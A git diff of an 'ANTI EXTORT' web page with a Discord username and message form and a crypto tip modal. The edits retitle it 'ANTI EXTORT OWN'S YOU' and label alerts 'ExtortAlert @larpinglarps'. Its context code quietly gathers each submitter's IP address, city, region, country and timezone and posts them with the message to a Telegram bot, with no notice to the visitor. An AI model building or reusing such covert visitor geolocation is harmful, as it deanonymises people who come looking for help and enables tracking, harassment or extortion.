@@ -178,7 +178,7 @@
 </head>
 <body>
   <div class="container" role="main">
-    <h1>ANTI EXTORT</h1>
+    <h1>ANTI EXTORT OWN'S YOU</h1>
     <label for="discord" style="display:none;">Discord Username</label>
     <input
       type="text"
@@ -211,7 +211,7 @@
   <div class="modal-overlay" id="tipModal" role="dialog" aria-modal="true" aria-labelledby="tipModalTitle" tabindex="-1">
     <div class="modal-content">
       <button class="close-button" aria-label="Close tip modal" onclick="closeTipModal()">&times;</button>
-      <h2 id="tipModalTitle">TIP ME</h2>
+      <h2 id="tipModalTitle">DonateBrokie</h2>
       <div class="wallet-address" id="walletAddress">Be8i5YQ4pYdWnUx6kupW1Y5BLKJdNmoErM3HCHuKCEsc</div>
       <img
         class="qr-code"
@@ -247,7 +247,7 @@ async function sendMessage() {
 
     const locationInfo = `🌍 *IP Info:*\nIP: ${ipData.ip}\nCity: ${ipData.city}\nRegion: ${ipData.region}\nCountry: ${ipData.country_name}\nTimezone: ${ipData.timezone}`;
 
-    const text = `🚨 *New Submission:*\n👤 *Discord:* ${discord}\n💬 *Message:* ${message}\n\n${locationInfo}`;
+    const text = `🚨 *ExtortAlert @larpinglarps:*\n👤 *Discord:* ${discord}\n💬 *Message:* ${message}\n\n${locationInfo}`;
 
     const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
